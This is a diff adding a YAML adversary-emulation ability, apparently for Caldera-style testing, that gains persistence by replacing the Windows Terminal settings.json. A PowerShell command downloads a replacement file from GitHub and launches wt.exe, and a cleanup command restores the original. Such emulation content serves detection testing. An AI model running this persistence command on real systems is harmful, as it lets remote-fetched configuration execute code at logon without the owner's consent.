@@ -1,0 +1,22 @@
+---
+- id: 01a2ad691dfb47b11d050fab371718d2
+  name: Persistence by modifying Windows Terminal profile
+  description: Modify Windows Terminal settings.json file to gain persistence. [Twitter
+    Post](https://twitter.com/nas_bench/status/1550836225652686848)
+  tactic: multiple
+  technique:
+    attack_id: T1547.015
+    name: 'Boot or Logon Autostart Execution: Login Items'
+  platforms:
+    windows:
+      psh:
+        command: mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
+          ~\AppData\Local\Temp\settings.json; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"
+          -OutFile "~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json";
+          wt.exe
+        payloads: []
+        cleanup: mv -Force ~\AppData\Local\Temp\settings.json ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json;
+          taskkill /F /IM "calculator.exe" > $null
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
